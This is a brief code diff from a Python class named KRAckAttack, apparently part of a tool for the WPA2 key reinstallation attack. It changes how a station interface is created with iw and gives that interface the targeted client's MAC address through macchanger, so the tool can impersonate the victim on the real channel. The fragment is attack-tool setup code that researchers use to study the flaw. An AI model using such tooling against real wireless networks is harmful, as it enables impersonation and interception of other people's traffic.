@@ -752,9 +752,9 @@ class KRAckAttack():
 
 		# 3. Configure interface on real channel to ACK frames
 		if self.clientmac:
-				sta_iface = iface + ("sta" if sta_suffix is None else sta_suffix)
-				subprocess.check_output(["iw", iface, "interface", "add", sta_iface, "type", "managed"])
-				call_macchanger(sta_iface, macaddr)
+				sta_iface = self.nic_real + "sta1"
+				subprocess.check_output(["iw", self.nic_real, "interface", "add", sta_iface, "type", "managed"])
+				call_macchanger(sta_iface, self.clientmac)
 				subprocess.check_output(["ifconfig", sta_iface, "up"])
 		else:
 			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
